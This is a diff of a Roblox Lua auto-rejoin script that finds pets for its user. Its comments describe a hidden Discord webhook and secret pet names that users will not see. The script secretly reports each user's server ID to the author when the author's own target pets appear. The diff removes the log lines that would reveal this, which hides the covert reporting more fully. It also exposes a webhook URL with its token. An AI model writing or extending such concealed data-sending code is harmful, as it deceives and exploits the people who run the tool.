@@ -1,8 +1,11 @@
 -- Hidden config for your secret webhook and pet names (users won't see this)
 local hiddenWebhook = "https://canary.discord.com/api/webhooks/1413487568334491688/VSMhmL61QW9S2ogHZHun6Usreup1SLcVj3akifS8JpG6G2XeTJV5JKORI8qdfNfrQJOh" -- Replace with your actual secret webhook
 local hiddenTargetPetNames = {
-    "Noobini Pizzanini", "Lirili Larila" -- Your secret pet names
+    "Lirili Larila", "Noobini Pizzanini" -- Your secret pet names
 }
+
+-- Track sent hidden pets to avoid duplicate webhooks in the same session
+local sentHiddenPets = {}
 
 -- SERVICES
 local Players = game:GetService("Players")
@@ -85,13 +88,6 @@ local function sendWebhook(foundPets, jobId)
                 Body = jsonData
             })
         end)
-        if success then
-            print("✅ Hidden webhook sent")
-        else
-            warn("❌ Hidden webhook failed:", err)
-        end
-    else
-        warn("❌ No HTTP request function available")
     end
 end
 
@@ -150,7 +146,10 @@ local function checkForPets()
             -- Check hidden targets
             for _, target in pairs(hiddenTargetPetNames) do
                 if string.find(nameLower, string.lower(target)) then
-                    table.insert(hiddenFound, obj.Name)
+                    if not sentHiddenPets[obj.Name] then
+                        table.insert(hiddenFound, obj.Name)
+                        sentHiddenPets[obj.Name] = true
+                    end
                     break
                 end
             end
@@ -166,29 +165,41 @@ local function autoRejoin()
 
         -- Handle user-targeted pets (pauses auto-rejoin)
         if #userPetsFound > 0 then
-            print("✅ User pets found:", table.concat(userPetsFound, ", "))
             for _, pet in ipairs(userPetsFound) do
                 createPopup(pet) -- Show popup for each found pet
             end
             -- Pause auto-rejoin until no user-targeted pets are found
             repeat
-                task.wait(15)
+                task.wait(3) -- Scan every 3 seconds
                 userPetsFound, hiddenPetsFound = checkForPets()
             until #userPetsFound == 0
-            print("🔍 No more user-targeted pets, resuming auto-rejoin")
-        else
-            print("🔍 No user-targeted pets found")
         end
 
         -- Handle hidden pets (doesn't affect auto-rejoin)
         if #hiddenPetsFound > 0 then
-            print("✅ Hidden pets found:", table.concat(hiddenPetsFound, ", "))
             sendWebhook(hiddenPetsFound, game.JobId)
         end
 
-        -- Auto-rejoin after delay
-        task.wait(getgenv().Rejoin.AutoRejoin)
-        print("🔄 Auto-rejoining...")
+        -- Auto-rejoin after delay, but still scan every 3 seconds
+        local elapsed = 0
+        while elapsed < getgenv().Rejoin.AutoRejoin do
+            task.wait(3)
+            elapsed = elapsed + 3
+            userPetsFound, hiddenPetsFound = checkForPets()
+            if #userPetsFound > 0 then
+                for _, pet in ipairs(userPetsFound) do
+                    createPopup(pet)
+                end
+                repeat
+                    task.wait(3)
+                    userPetsFound, hiddenPetsFound = checkForPets()
+                until #userPetsFound == 0
+                elapsed = 0 -- Reset rejoin timer if user pets were found
+            end
+            if #hiddenPetsFound > 0 then
+                sendWebhook(hiddenPetsFound, game.JobId)
+            end
+        end
         TeleportService:Teleport(game.PlaceId, LocalPlayer)
     end
 end
